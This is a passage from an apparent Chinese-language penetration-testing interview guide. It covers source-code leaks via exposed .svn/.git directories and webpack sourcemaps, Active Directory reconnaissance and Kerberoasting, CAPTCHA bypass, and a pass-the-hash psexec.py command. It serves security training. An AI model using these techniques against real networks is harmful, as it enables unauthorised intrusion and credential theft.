<li><code>/.svn/entries</code>：在 SVN 1.6 及更早版本中，这个文件包含了目录下所有文件的元数据，包括文件名、版本号、文件类型等。攻击者可以通过解析这个文件，获取所有文件的相对路径</li>
<li><code>/.svn/text-base/</code>：这个目录存储了每个文件的原始版本副本。文件名通常是 <code>filename.svn-base</code>。攻击者可以下载这些文件来获取源代码</li>
</ul>
<p><strong>如何利用</strong></p>
<p>利用 SVN 源代码泄露，通常需要一个自动化工具来递归下载所有 <code>.svn</code> 目录下的文件，并根据元数据将它们重组为完整的代码库</p>
<ol>
<li><strong>探测</strong>：在目标网站 URL 后面加上 <code>/.svn/entries</code> 或 <code>/.svn/wc.db</code>（SVN 1.7+）来探测漏洞是否存在<ul>
<li><code>http://example.com/.svn/entries</code></li>
<li><code>http://example.com/some-dir/.svn/entries</code></li>
</ul>
</li>
<li><strong>自动化下载与重构</strong>：使用 <code>svn-dumper</code>、<code>dvcs-ripper</code> 等工具。这些工具能够自动化完成下载和还原代码的过程</li>
</ol>
<p><strong>Git 源代码泄露</strong></p>
<p>Git 是一个分布式版本控制系统，它的核心目录是 <code>.git</code>。和 SVN 类似，当开发者将代码直接在 Web 目录下进行 <code>git init</code> 或 <code>git clone</code> 操作时，<code>.git</code> 目录就会被创建并暴露出来</p>
<p><strong>漏洞原理</strong></p>
<p><code>/.git/</code> 目录包含了 Git 版本库的所有信息，如对象（objects）、引用（refs）、索引（index）、配置文件（config）等。攻击者可以通过下载这些文件，利用 Git 内部的命令来还原代码</p>
<ul>
<li><code>/.git/HEAD</code>：指向当前分支，可以确定当前分支名</li>
<li><code>/.git/index</code>：包含了暂存区的文件信息</li>
<li><code>/.git/objects/</code>：这个目录存储了所有的 Git 对象（包括文件、目录、提交等）。这是攻击者还原代码最关键的目录</li>
</ul>
<p><strong>如何利用</strong></p>
<ol>
<li><strong>探测</strong>：在目标 URL 后面加上 <code>/.git/</code> 或 <code>/.git/config</code> 来探测漏洞<ul>
<li><code>http://example.com/.git/config</code></li>
<li><code>http://example.com/.git/HEAD</code></li>
</ul>
</li>
<li><strong>下载与重构</strong>：同样可以使用 <code>dvcs-ripper</code> 或专门针对 Git 的工具。这些工具会下载 <code>.git</code> 目录下的所有文件，然后在本地创建一个 Git 仓库并还原出源代码<ul>
<li>通过 <code>git log</code> 查看提交历史</li>
<li>通过 <code>git checkout</code> 切换到不同版本，获取所有版本的代码</li>
</ul>
</li>
</ol>
<hr>
<h3 id="说说域信息收集思路"><a href="#说说域信息收集思路" class="headerlink" title="说说域信息收集思路"></a>说说域信息收集思路</h3><p><strong>阶段一：宏观侦察</strong></p>
<p>这个阶段的目标是<strong>在不暴露自己身份的情况下，尽可能多地了解域环境的整体情况</strong></p>
<ol>
<li><strong>确定网络边界和域控位置：</strong><ul>
<li><strong>DNS 侦察：</strong> 查询 DNS 服务器，获取域控（DC）、全局编录服务器（GC）的 IP 地址。通常通过 <code>nslookup</code> 或 <code>dig</code> 命令查询 <code>_ldap._tcp.dc._msdcs.&lt;domain_name&gt;</code> 或 <code>_kerberos._tcp.dc._msdcs.&lt;domain_name&gt;</code> 记录。这是最基本的域内服务发现方法</li>
<li><strong>SMB 侦察：</strong> 使用 <code>nbtscan</code> 或 <code>nmap</code> 扫描器，发现网络中开放了 445 端口（SMB）的主机，这些主机很可能是 Windows 主机，其中域控的特征会更明显</li>
</ul>
</li>
<li><strong>判断域的信任关系：</strong><ul>
<li>域之间可能存在信任关系，允许一个域的用户访问另一个域的资源。通过 <code>nltest /domain_trusts</code> 或 PowerView 的 <code>Get-DomainTrust</code> 命令可以列出域之间的信任关系。这是一个重要的横向移动点，如果能控制一个受信任的子域，可能可以借此攻击主域</li>
</ul>
</li>
<li><strong>发现域内主机：</strong><ul>
<li><strong>ICMP&#x2F;ARP 扫描：</strong> 使用 <code>ping</code> 或 <code>nmap -sn</code> 对内网 IP 段进行存活主机探测</li>
<li><strong>端口扫描：</strong> 发现域内主机开放的服务，特别是 Kerberos (88&#x2F;TCP)、LDAP (389&#x2F;TCP)、SMB (445&#x2F;TCP)、WinRM (5985&#x2F;TCP) 等与域服务相关的端口</li>
</ul>
</li>
</ol>
<p><strong>阶段二：微观信息枚举</strong></p>
<p>在初步了解了域环境后，这个阶段的目标是<strong>利用已有的权限（即使是普通用户权限），深入挖掘域内的各种实体信息</strong></p>
<p><strong>1. 用户和组信息枚举</strong></p>
<ul>
<li><strong>目标：</strong> 发现域内所有用户、管理员账户、组及其成员</li>
<li><strong>常用技术：</strong><ul>
<li><strong><code>net user /domain</code> 和 <code>net group /domain</code>：</strong> 最基础的命令行工具，可以列出域内用户和组</li>
<li><strong>PowerView (PowerShell):</strong> 这是域渗透中最强大的信息收集工具之一。它提供了大量 cmdlet，如 <code>Get-DomainUser</code>、<code>Get-DomainGroup</code>、<code>Get-DomainGroupMember</code>，可以高效、详细地查询域内用户、组及其关系</li>
<li><strong>AdFind.exe：</strong> 一款经典的 LDAP 查询工具，可以灵活地查询域内任何信息</li>
<li><strong>BloodHound：</strong> 这是一个革命性的工具，它通过收集域内用户、组、计算机、服务等实体之间的关系，并以图形化方式展示，帮助攻击者快速找到通往域控的<strong>最短攻击路径</strong>。这是渗透测试中必不可少的工具</li>
</ul>
</li>
</ul>
<p><strong>2. 计算机和域控信息枚举</strong></p>
<ul>
<li><strong>目标：</strong> 发现域内所有计算机，特别是域控、高权限服务器，以及这些机器上运行的服务</li>
<li><strong>常用技术：</strong><ul>
<li><strong>PowerView 的 <code>Get-DomainComputer</code>：</strong> 可以获取域内所有计算机的详细信息，包括操作系统、角色（如是否为域控）等</li>
<li><strong>SMB 和 WinRM 枚举：</strong> 尝试连接域内计算机的 SMB 或 WinRM 服务，并使用已有的凭据进行登录，如果成功，可以进一步收集该机器上的本地信息。</li>
</ul>
</li>
</ul>
<p><strong>3. 服务信息枚举（Kerberoasting）</strong></p>
<ul>
<li><strong>目标：</strong> 发现域内所有注册了 SPN (Service Principal Name) 的服务账户</li>
<li><strong>常用技术：</strong><ul>
<li><strong>PowerView 的 <code>Get-DomainSPN</code>：</strong> 专门用于查询注册了 SPN 的服务账户</li>
<li><strong>Kerberoasting 攻击：</strong> 通过向 KDC (Key Distribution Center) 请求特定服务的 TGS 票据，然后离线破解票据中的哈希，从而获取服务账户的明文密码。这是一个非常高效的域内提权和横向移动方法</li>
</ul>
</li>
</ul>
<p><strong>4. 组策略信息（SYSVOL）</strong></p>
<ul>
<li><strong>目标：</strong> 收集域内的组策略设置，寻找配置不当或包含敏感信息的 GPO</li>
<li><strong>常用技术：</strong><ul>
<li><strong>访问 <code>\\&lt;domain_name&gt;\SYSVOL</code> 共享：</strong> SYSVOL 文件夹是公开可访问的</li>
<li><strong>搜索 <code>SYSVOL</code>：</strong> 在 SYSVOL 文件夹中搜索密码、脚本（如 <code>.vbs</code> 或 <code>.bat</code> 文件）或任何可能包含敏感信息的 XML 文件。有时管理员会将密码硬编码在组策略脚本中，这会是一个巨大的突破口</li>
</ul>
</li>
</ul>
<p><strong>5. 域内漏洞扫描与识别</strong></p>
<ul>
<li><strong>目标：</strong> 发现域内存在的已知漏洞，特别是与域服务相关的关键漏洞</li>
<li><strong>常用技术：</strong><ul>
<li><strong>PowerView 的 <code>Find-DomainVulnerableSPN</code> 等：</strong> 寻找可能存在漏洞的配置</li>
<li><strong>专业漏洞扫描器：</strong> 使用商业或开源的漏洞扫描器，如 Nessus、OpenVAS 或专门针对域控的漏洞扫描工具，检查域控和成员服务器是否存在 Zerologon (CVE-2020-1472)、PetitPotam (CVE-2021-36942) 等严重漏洞</li>
</ul>
</li>
</ul>
<hr>
<h3 id="如何快速定位域控"><a href="#如何快速定位域控" class="headerlink" title="如何快速定位域控"></a>如何快速定位域控</h3><p><strong>1. 使用内置环境变量</strong></p>
<p>这是最快、最简单的方法，特别是在你已经获得域内任意一台 Windows 主机的权限时</p>
<p>当一台 Windows 主机加入域后，它会自动设置一个名为 <code>%LOGONSERVER%</code> 的环境变量，该变量存储了当前用于登录认证的域控名称。</p>
<ul>
<li><p><strong>命令：</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> %LOGONSERVER%</span><br></pre></td></tr></table></figure>

<p>或者在 PowerShell 中：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$env:LOGONSERVER</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>优点：</strong> 无需任何额外工具，几乎即时返回结果</p>
</li>
</ul>
<p><strong>2. 通过 DNS 服务查询</strong></p>
<p>在域环境中，域控会在 DNS 服务器上注册特定的服务记录（SRV Records），这些记录指向其 IP 地址和端口。这是最可靠的定位方法之一</p>
<ul>
<li><p><strong>命令：</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup <span class="literal">-type</span>=SRV _ldap._tcp.dc._msdcs.yourdomain.com</span><br></pre></td></tr></table></figure>

<p>将 <code>yourdomain.com</code> 替换为目标域的名称。例如，如果域是 <code>contoso.local</code>，命令就是 <code>nslookup -type=SRV _ldap._tcp.dc._msdcs.contoso.local</code></p>
</li>
<li><p><strong>输出：</strong> DNS 服务器会返回包含域控主机名和 IP 地址的列表</p>
</li>
<li><p><strong>优点：</strong> 几乎所有 Windows 域都依赖 DNS 服务，这种方法非常通用且准确</p>
</li>
</ul>
<p><strong>3. 利用 Windows 内置工具</strong></p>
<p><code>nltest</code> 是一个用于测试和管理网络登录服务的命令行工具，可以用来发现域控</p>
<ul>
<li><p><strong>命令：</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /dclist:yourdomain.com</span><br></pre></td></tr></table></figure>

<p>这个命令会列出域内的所有域控</p>
</li>
<li><p><strong>优点：</strong> 无需管理员权限，可以在任何域成员主机上运行，非常方便</p>
</li>
</ul>
<p><strong>4. 使用端口扫描</strong></p>
<p>域控提供多种核心服务，这些服务都在特定的端口上运行。通过扫描这些端口，可以有效地识别出域控</p>
<ul>
<li><p><strong>关键端口：</strong></p>
<ul>
<li><strong>Kerberos:</strong> 88&#x2F;TCP</li>
<li><strong>LDAP:</strong> 389&#x2F;TCP</li>
<li><strong>LDAP over SSL:</strong> 636&#x2F;TCP</li>
<li><strong>Global Catalog:</strong> 3268&#x2F;TCP</li>
<li><strong>SMB:</strong> 445&#x2F;TCP</li>
</ul>
</li>
<li><p><strong>Nmap 扫描：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 88,135,139,389,445,636 --open &lt;internal_network_range&gt;</span><br></pre></td></tr></table></figure>

<p>这个命令会扫描指定网段中开放了这些域控服务端口的主机。 你还可以使用 Nmap 的脚本来更精确地识别：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 88 --script krb5-enum-users &lt;ip_address&gt;</span><br></pre></td></tr></table></figure>

<p>如果一个主机在 88 端口上运行了 Kerberos 服务，它很可能就是域控</p>
</li>
</ul>
<hr>
<h3 id="Wappalyzer-怎么进行指纹识别的"><a href="#Wappalyzer-怎么进行指纹识别的" class="headerlink" title="Wappalyzer 怎么进行指纹识别的"></a>Wappalyzer 怎么进行指纹识别的</h3><p>Wappalyzer 的指纹识别过程可以概括为以下几个主要步骤：</p>
<ol>
<li><strong>特征库匹配</strong>：Wappalyzer 维护一个巨大的、社区驱动的 JSON 特征库文件，其中包含了各种 Web 技术（如 CMS、Web 服务器、前端框架、编程语言、数据库等）的<strong>独特指纹信息</strong></li>
<li><strong>获取信息</strong>：当你访问一个网站时，Wappalyzer 会利用浏览器已经加载的数据，从中提取出以下几类信息：<ul>
<li><strong>HTTP 响应头（HTTP Headers）</strong>：检查 <code>Server</code>、<code>X-Powered-By</code>、<code>Set-Cookie</code> 等响应头字段。例如，<code>Server: Nginx</code> 就直接表明使用了 Nginx 服务器；<code>X-Powered-By: PHP/7.4.3</code> 则表明使用了特定版本的 PHP</li>
<li><strong>HTML 页面内容</strong>：在页面的 <code>&lt;body&gt;</code> 和 <code>&lt;head&gt;</code> 标签中搜索特定的字符串。例如，许多 CMS 会在页面中包含特定的元标签，如 <code>&lt;meta name=&quot;generator&quot; content=&quot;WordPress 6.0.1&quot; /&gt;</code>，这直接暴露了所使用的技术及其版本</li>
<li><strong>JavaScript 变量和库</strong>：检查全局 JavaScript 变量或特定库文件的存在。例如，如果页面加载了 <code>jquery.js</code>，并且存在 <code>window.jQuery</code> 变量，Wappalyzer 就可以识别出使用了 jQuery 库</li>
<li><strong>URL 路径和文件名</strong>：分析 URL 的结构，特别是目录和文件名。例如，<code>/wp-content/</code> 目录是 WordPress 的典型特征；而 <code>/admin</code> 或 <code>/login</code> 路径可能指向特定的 CMS 或框架</li>
<li><strong>Cookies</strong>：检查 Cookie 名称或值。例如，<code>wordpress_logged_in_...</code> 或 <code>PHPSESSID</code> 都是典型的指纹信息</li>
<li><strong>CSS 文件</strong>：通过分析 CSS 文件的路径、内容或文件名来识别技术</li>
</ul>
</li>
<li><strong>匹配与判断</strong>：Wappalyzer 将上述提取到的信息与本地的特征库进行比对。如果某个或某几个特征与库中的某个技术指纹相匹配，那么该技术就会被识别出来，并显示在 Wappalyzer 的图标或面板中</li>
<li><strong>结果展示</strong>：最终，Wappalyzer 会将所有匹配成功的技术以图标和文字的形式展示给用户，通常还会附带该技术的名称、版本和类型（如 CMS、框架、库等）</li>
</ol>
<hr>
<h3 id="登录验证码怎么绕过"><a href="#登录验证码怎么绕过" class="headerlink" title="登录验证码怎么绕过"></a>登录验证码怎么绕过</h3><p><strong>1. 验证码本身的设计缺陷</strong></p>
<p>很多验证码系统本身存在漏洞，这是最容易利用的突破口</p>
<ul>
<li><strong>万能验证码或静态验证码：</strong> 有些开发者为了方便测试，会设置一个固定的“万能验证码”，比如 <code>1234</code> 或 <code>abcd</code>。或者验证码每次刷新都是一样的。这使得攻击者可以轻松地在每次登录尝试时都使用这个固定的值</li>
<li><strong>验证码可重复利用：</strong> 正常情况下，验证码使用一次后就应该失效。如果验证码可以重复使用，攻击者就可以通过一次有效的请求获取一个验证码，然后在多次请求中重复使用它来尝试不同的密码</li>
<li><strong>验证码在客户端生成：</strong> 尽管非常罕见，但有些不安全的实现是在前端（如JavaScript）生成验证码。这意味着攻击者可以直接在浏览器控制台中获取或修改验证码的值</li>
<li><strong>验证码不与会话绑定：</strong> 验证码与用户会话（Session）没有正确绑定。攻击者可以先访问登录页面，获取一个验证码，然后用不同的会话（但使用同一个验证码）来尝试暴力破解，这使得验证码失去了它的防重放作用</li>
</ul>
<p><strong>2. 暴力破解验证码</strong></p>
<p>如果验证码系统本身没有设计缺陷，攻击者可能会尝试通过技术手段识别验证码</p>
<ul>
<li><strong>简单验证码的图像识别：</strong> 对于那些扭曲度低、背景干扰少、字符集简单的验证码（如纯数字、4 位字母），攻击者可以使用 **OCR（光学字符识别）**工具或专门的验证码识别库（如 Tesseract、dlib）进行识别</li>
<li><strong>训练模型识别验证码：</strong> 对于更复杂的验证码，攻击者可以收集大量的验证码图片，然后使用机器学习或深度学习技术（如卷积神经网络 CNN）来训练一个模型，以达到较高的识别成功率</li>
<li><strong>人工打码平台：</strong> 这是最直接、最有效的方法。攻击者将验证码图片发送到专业的<strong>打码平台</strong>。这些平台背后有大量人工或半自动化工具，可以在极短时间内返回识别结果。这使得攻击者能够以较低的成本实现大规模的自动化攻击</li>
</ul>
<p><strong>3. 绕过验证码逻辑</strong></p>
<ul>
<li><strong>API 接口漏洞：</strong> 有些应用程序的登录过程并非只有一个接口。攻击者可能会发现，用于处理登录的 API 接口与用于获取验证码的接口是分开的。如果登录 API 接口没有强制要求验证码参数，或者在验证码参数为空时依然处理请求，那么攻击者可以直接绕过验证码步骤</li>
<li><strong>不安全的登录逻辑：</strong> 攻击者可以尝试多次错误的登录，观察服务器的响应。如果服务器只在第一次登录尝试时返回验证码，或者在多次失败后才返回验证码，攻击者可以利用这个时间差进行快速尝试</li>
<li><strong>会话劫持或利用令牌：</strong> 如果应用程序在登录过程中使用了某种令牌（Token），而验证码的验证没有正确与这个令牌关联，那么攻击者可以利用这个漏洞绕过验证码</li>
</ul>
<hr>
<h3 id="工作组环境下怎么判断是否有域环境"><a href="#工作组环境下怎么判断是否有域环境" class="headerlink" title="工作组环境下怎么判断是否有域环境"></a>工作组环境下怎么判断是否有域环境</h3><p><strong>1. 系统信息查看</strong></p>
<p>这是最直接、最常用的方法。</p>
<ul>
<li><strong>GUI 界面</strong>：<ul>
<li>右键点击“此电脑”或“我的电脑”，选择“属性”</li>
<li>在弹出的窗口中，找到**“计算机名、域和工作组设置”**</li>
<li>如果显示的是“工作组：WORKGROUP”或其他工作组名称，则很可能处于工作组环境</li>
<li>如果显示的是“域：xxx.local”或类似域名，则表明当前计算机已加入域</li>
</ul>
</li>
<li><strong>命令行（CMD&#x2F;PowerShell）</strong>：<ul>
<li>使用 <code>systeminfo</code> 命令。在命令输出中，寻找**“域”<strong>或</strong>“登录域”**字段。如果显示具体的域名，那就是域环境；如果显示“WORKGROUP”，那就是工作组</li>
<li>使用<code>net config workstation</code>命令。该命令会显示当前计算机的配置信息，其中“工作站域”会明确列出当前是工作组还是域</li>
<li>使用<code>whoami /all</code>命令。该命令会显示当前用户的详细信息，包括所属的域或工作组</li>
</ul>
</li>
</ul>
<p><strong>2. 网络和 DNS 配置</strong></p>
<p>域环境依赖于特定的网络配置，尤其是 DNS</p>
<ul>
<li><strong>DNS 服务器</strong>：<ul>
<li>域环境中的客户端通常会将 DNS 服务器设置为域控制器或指向域控制器的 DNS 解析服务器</li>
<li>你可以通过 <code>ipconfig /all</code> 命令查看当前主机的 DNS 服务器地址。如果 DNS 服务器地址指向内网IP，且该 IP 可能就是域控制器，那就值得怀疑。</li>
<li>你可以尝试 <code>nslookup</code> 命令解析域名。在域环境中，客户端可以解析域控制器名称（例如：<code>nslookup dc.example.com</code>），而在工作组环境中通常无法解析</li>
</ul>
</li>
<li><strong>Ping 域控制器</strong>：<ul>
<li>如果你能猜测或已经获得了可能的域控制器名称，可以尝试 <code>ping</code> 该域名。如果 ping 通了，说明网络是连通的，并且 DNS 解析正常，很可能存在域环境</li>
<li>例如：<code>ping test.local</code></li>
</ul>
</li>
</ul>
<p><strong>3. 登录方式和用户账户</strong></p>
<p>用户登录界面的信息也会提供线索</p>
<ul>
<li><strong>登录界面</strong>：<ul>
<li>在 Windows 登录界面，如果用户名输入框上方或下方显示**“登录到：xxx.local”**，说明可以登录到域</li>
<li>工作组环境通常只显示本地计算机名</li>
</ul>
</li>
<li><strong>用户账户</strong>：<ul>
<li>在工作组环境中，本地用户通常是 <code>用户名</code></li>
<li>在域环境中，用户登录名通常是 <code>域名\用户名</code> 或 <code>用户名@域名</code></li>
<li>可以通过 <code>net user</code> 或 <code>whoami</code> 命令来查看当前用户的完整信息。如果显示 <code>test\administrator</code> 或<code>test.local\user</code>，那就很可能是域环境</li>
</ul>
</li>
</ul>
<h4 id="4-特定的网络服务和端口"><a href="#4-特定的网络服务和端口" class="headerlink" title="4. 特定的网络服务和端口"></a>4. 特定的网络服务和端口</h4><p>域环境中的主机通常会开放一些特定的服务和端口，用于域内通信。</p>
<ul>
<li><strong>Kerberos协议</strong>：域环境使用Kerberos进行身份验证。攻击者可以扫描域控制器特有的端口（如TCP&#x2F;UDP 88）。</li>
<li><strong>LDAP协议</strong>：域控制器提供LDAP服务（轻量目录访问协议），用于管理目录信息。端口通常是TCP 389或636（LDAPS）。</li>
<li><strong>SMB协议</strong>：虽然工作组和域都使用SMB，但在域环境中，通过<code>net view</code>等命令可以看到域内共享资源。</li>
</ul>
<p>通过端口扫描工具（如Nmap），可以快速发现目标主机是否开放了这些与域相关的服务端口</p>
<hr>
<h3 id="只有一个网卡通过什么方式判断内网中是否有其他网段"><a href="#只有一个网卡通过什么方式判断内网中是否有其他网段" class="headerlink" title="只有一个网卡通过什么方式判断内网中是否有其他网段"></a>只有一个网卡通过什么方式判断内网中是否有其他网段</h3><p><strong>1. 路由表分析</strong></p>
<p>这是最直接、最快速的方式。当一个主机连接到网络时，它的操作系统会维护一个路由表，其中包含了到达不同目标网络的数据包应该通过哪个网关发送。通过分析这个路由表，我们可以发现除了默认网关之外，是否还有其他的内网路由规则</p>
<p>在 <strong>Windows</strong> 系统中，可以使用以下命令：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route <span class="built_in">print</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -rn</span><br></pre></td></tr></table></figure>

<p>这两个命令都会显示详细的路由信息。关注“活动路由”或“Persistent Routes”部分。如果发现除了<code>0.0.0.0</code>（默认网关）以外，还有其他<code>10.0.0.0/8</code>、<code>172.16.0.0/12</code>或<code>192.168.0.0/16</code>等私有地址网段的路由，那就表明存在通向这些网段的路径</p>
<p>在 <strong>Linux&#x2F;macOS</strong> 系统中，可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route show</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -r</span><br></pre></td></tr></table></figure>

<p>同样，检查输出结果中是否有指向其他内网网段的路由条目。例如，你可能会看到类似于<code>192.168.2.0/24 via 192.168.1.1 dev eth0</code>的条目，这说明存在一个到<code>192.168.2.0</code>网段的路由</p>
<p><strong>2. ARP 缓存表分析</strong></p>
<p><strong>ARP</strong>（Address Resolution Protocol）用于将IP地址解析为物理MAC地址。当主机与同一局域网内的其他设备通信时，它会将对应的IP-MAC映射关系存储在<strong>ARP缓存表</strong>中。通过查看这个缓存表，我们可以发现哪些主机是活跃的</p>
<p>使用以下命令来查看：</p>
<ul>
<li><strong>Windows</strong>：<code>arp -a</code></li>
<li><strong>Linux&#x2F;macOS</strong>：<code>arp -n</code></li>
</ul>
<p>如果你的ARP缓存表中出现了不同网段的IP地址，比如你当前IP是<code>192.168.1.100</code>，但缓存表中出现了<code>192.168.2.1</code>的条目，这可能是一个网络设备（如路由器或三层交换机）的IP地址，它负责连接到另一个网段</p>
<p><strong>3. DNS 和 WINS 服务查询</strong></p>
<p><strong>DNS</strong>（域名系统）和 <strong>WINS</strong>（Windows Internet Name Service）在内部网络中扮演着关键角色。内网中的主机通常会依赖这些服务来解析主机名。通过查询这些服务，我们可以发现属于其他网段的主机</p>
<ul>
<li><strong>DNS 查询</strong>：<ul>
<li>在Windows上，使用<code>nslookup</code>或<code>dig</code>命令</li>
<li>例如：<code>nslookup -type=any example.local</code></li>
<li>如果能查询到属于不同网段的A记录（主机名-IP地址映射），那就能确认存在其他网段</li>
</ul>
</li>
<li><strong>WINS 查询</strong>：<ul>
<li>在Windows上，可以使用<code>nbtstat -r</code>命令。它会显示通过广播或WINS服务器获取的NetBIOS名称解析统计信息。如果能看到不同网段的主机名，就说明存在其他网段</li>
</ul>
</li>
</ul>
<hr>
<h3 id="说说-Webpack-信息泄露"><a href="#说说-Webpack-信息泄露" class="headerlink" title="说说 Webpack 信息泄露"></a>说说 Webpack 信息泄露</h3><p><strong>常见的泄露文件和表现形式</strong></p>
<ul>
<li><strong><code>\*.js.map</code> 文件</strong>: 这是最常见的<code>sourcemap</code>文件，例如 <code>main.bundle.js.map</code>。通过这些文件，可以还原出完整的源代码目录结构和内容</li>
<li><strong>源代码中的注释</strong>: 开发过程中留下的注释，如TODO、FIXME、调试信息，甚至是一些硬编码的敏感信息</li>
<li><strong>前端路由和API接口地址</strong>: <code>sourcemap</code>中会暴露所有前端路由配置，攻击者可以借此发现未公开的页面或接口</li>
<li><strong>环境变量和密钥</strong>: 如果在前端代码中使用了<code>process.env</code>等方式读取了后端传递的环境变量，这些变量可能会被打包并泄露</li>
<li><strong>打包配置文件</strong>: 一些不当的配置可能会导致<code>webpack.config.js</code>等文件也被泄露，从中可以获取更多项目结构和依赖信息</li>
</ul>
<p><strong>渗透测试中的利用方法</strong></p>
<ol>
<li><strong>发现目标</strong>: 首先，通过浏览器或Burp Suite等工具访问目标网站，观察前端加载的<code>.js</code>文件，看是否存在<code>.map</code>文件。例如，如果存在<code>main.bundle.js</code>，尝试访问<code>main.bundle.js.map</code></li>
<li><strong>目录猜解</strong>: 有时<code>sourcemap</code>文件没有直接暴露，但可以通过对<code>.js</code>文件的URL进行目录猜解。比如，如果<code>js</code>文件在<code>/static/js/</code>下，那么<code>sourcemap</code>可能也在这个目录下</li>
<li><strong>使用自动化工具</strong>: 有很多工具可以自动化这一过程。例如，使用<code>npm install -g reverse-sourcemap</code>安装的工具可以从<code>*.js.map</code>文件还原出源代码。此外，一些渗透测试框架如<code>Nuclei</code>也包含了专门针对Webpack信息泄露的扫描模板</li>
<li><strong>手动分析</strong>: 如果找到了<code>sourcemap</code>文件，下载下来并使用文本编辑器打开。<code>.map</code>文件是JSON格式，其中<code>sourcesContent</code>字段包含了原始的源代码内容，<code>sources</code>字段包含了原始的文件路径。通过分析这些字段，可以快速定位敏感信息</li>
</ol>
<hr>
<h3 id="net-group-“Domain-Admins”-domain-这条命令查询域内管理员没查到，那么可能出现了什么问题，怎么解决"><a href="#net-group-“Domain-Admins”-domain-这条命令查询域内管理员没查到，那么可能出现了什么问题，怎么解决" class="headerlink" title="net group “Domain Admins” &#x2F;domain 这条命令查询域内管理员没查到，那么可能出现了什么问题，怎么解决"></a>net group “Domain Admins” &#x2F;domain 这条命令查询域内管理员没查到，那么可能出现了什么问题，怎么解决</h3><p><strong>1. 权限问题</strong></p>
<p>这是最常见的原因。<code>net group &quot;Domain Admins&quot; /domain</code> 这条命令需要<strong>域用户的身份</strong>才能正确执行</p>
<ul>
<li><p><strong>问题所在</strong>：你当前 Shell 所处的机器可能是一个工作组机器，或者你使用的是一个本地账户，没有通过认证来访问域控制器。即使你获得了 SYSTEM 权限，它也只是本地机器的最高权限，无法直接用来查询域内的资源</p>
</li>
<li><p><strong>解决方案</strong>：你需要获得一个<strong>域用户的凭据</strong>（用户名和密码&#x2F;哈希）。然后通过以下方法进行认证：</p>
<ul>
<li><p><strong>哈希传递（Pass-the-Hash）</strong>：如果手上有一个域用户的哈希，你可以使用 <strong><code>psexec.py</code></strong> 或 <strong><code>mimikatz</code></strong> 等工具，以该用户的身份在域内执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Impacket工具包</span></span><br><span class="line">psexec.py domain.local/user@dc_ip -hashes &lt;哈希&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Kerberos 票据注入</strong>：如果手上有一个域用户的 Kerberos 票据（TGT），你可以使用 <strong><code>mimikatz</code></strong> 的 <strong><code>kerberos::ptt</code></strong> 命令将其注入到当前会话中，然后你的 Shell 就具备了访问域资源的权限</p>
</li>
</ul>
</li>
</ul>
<p><strong>2. 网络连接问题</strong></p>
<p>即使你拥有正确的权限，如果网络连接存在问题，命令也无法成功执行</p>
<ul>
<li><strong>问题所在</strong>：你的机器可能无法直接与域控制器（DC）通信。这可能是因为：<ul>
<li><strong>防火墙</strong>：目标机器的防火墙阻止了 SMB&#x2F;LDAP 协议的流量</li>
<li><strong>路由问题</strong>：你的机器不在域所在的网络段，无法直接路由到 DC</li>
<li><strong>端口未开放</strong>：DC 可能没有开放必要的端口，如 LDAP (389) 或 SMB (445)</li>
</ul>
</li>
<li><strong>解决方案</strong>：<ul>
<li><strong>端口扫描</strong>：使用 <strong><code>nmap</code></strong> 等工具扫描 DC 的 IP 地址，检查 389 (LDAP)、445 (SMB) 等端口是否开放</li>
<li><strong>端口转发&#x2F;隧道</strong>：如果你能访问域内的一台机器，但不能直接访问 DC，可以考虑使用端口转发工具，如 <strong><code>chisel</code></strong> 或 <strong><code>ssh -L</code></strong>，将 DC 的流量转发到你的本地机器，从而绕过防火墙或路由限制</li>
</ul>
</li>
</ul>
<hr>
<h3 id="继上题，这条命令的本质究竟是去哪里查"><a href="#继上题，这条命令的本质究竟是去哪里查" class="headerlink" title="继上题，这条命令的本质究竟是去哪里查"></a>继上题，这条命令的本质究竟是去哪里查</h3><p><strong>查询的详细过程</strong></p>
<ol>
<li><strong>发出请求</strong>：当你在一台域成员机器上执行 <code>net group &quot;Domain Admins&quot; /domain</code> 命令时，你的电脑会向配置的<strong>域控制器</strong>发送一个网络请求。这个请求是一个基于 <strong>LDAP</strong>（Lightweight Directory Access Protocol，轻量级目录访问协议）的查询，它包含了你想要查询的对象，也就是 <code>&quot;Domain Admins&quot;</code> 这个组</li>
<li><strong>验证身份</strong>：域控制器会首先验证你的身份。它会检查你当前所使用的账户（无论是用户账户还是机器账户）是否是域的一部分，并且是否有权限查询这个组的信息。如果你的账户是<strong>域用户</strong>，它通常就有权限执行这个查询</li>
<li><strong>Active Directory 数据库查询</strong>：验证通过后，域控制器会在它的 <strong>Active Directory</strong> 数据库中查找名为 <code>&quot;Domain Admins&quot;</code> 的安全组对象。Active Directory 是一个分层数据库，用于存储域内所有对象（用户、组、计算机等）的信息</li>
